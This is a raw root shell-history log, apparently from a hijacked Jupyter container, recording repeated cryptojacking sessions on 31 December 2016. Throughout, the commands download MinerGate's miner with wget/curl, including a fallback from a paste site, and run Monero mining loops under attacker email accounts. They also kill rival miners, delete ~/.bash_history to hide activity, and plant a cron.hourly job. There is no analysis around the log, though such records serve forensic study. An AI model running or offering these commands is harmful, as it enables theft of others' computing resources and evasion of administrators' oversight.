+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 10:55 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 10:55 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 10:55 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 10:55 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 11:27 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 11:58 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+kill -9 4652;  ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161231 12:25 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /notebooks
+kill -9 4443;  ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/2 20161231 12:26 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 12:28 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 12:28 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 12:28 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 12:29 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 12:29 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 13:00 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161231 13:14 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/2 20161231 13:14 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/2 20161231 13:14 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/2 20161231 13:14 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/2 20161231 13:14 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/2 20161231 13:14 /root
+ top c  ### root@f5e57551b879 /dev/pts/2 20161231 13:14 /root
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root/.deb/opt/minergate-cli
+exit ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 14:00 /root/.deb/opt/minergate-cli
+exit ### root@f5e57551b879 /dev/pts/3 20161231 14:20 /notebooks
+exit ### root@f5e57551b879 /dev/pts/3 20161231 14:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 14:20 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 14:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /notebooks
+kill -9 5179;  ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /notebooks
+kill -9 4892;  ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 14:21 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 14:22 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 14:22 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 14:22 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 14:22 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161231 14:22 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161231 14:22 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 14:30 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 14:30 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 14:30 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 14:30 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 14:30 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 15:00 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 15:29 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 15:59 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 16:09 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 16:09 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 16:09 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 16:09 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /notebooks
+kill -9 5715;  ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /notebooks
+kill -9 5422;  ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 16:10 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 16:11 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 16:11 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 16:11 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161231 16:11 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161231 16:11 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 16:59 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 16:59 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 16:59 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 16:59 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 16:59 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 17:29 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+kill -9 6108;  ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 17:52 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /notebooks
+kill -9 5983;  ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161231 17:53 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 18:30 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 18:30 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 18:30 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 18:31 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 18:31 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root/.deb/opt/minergate-cli
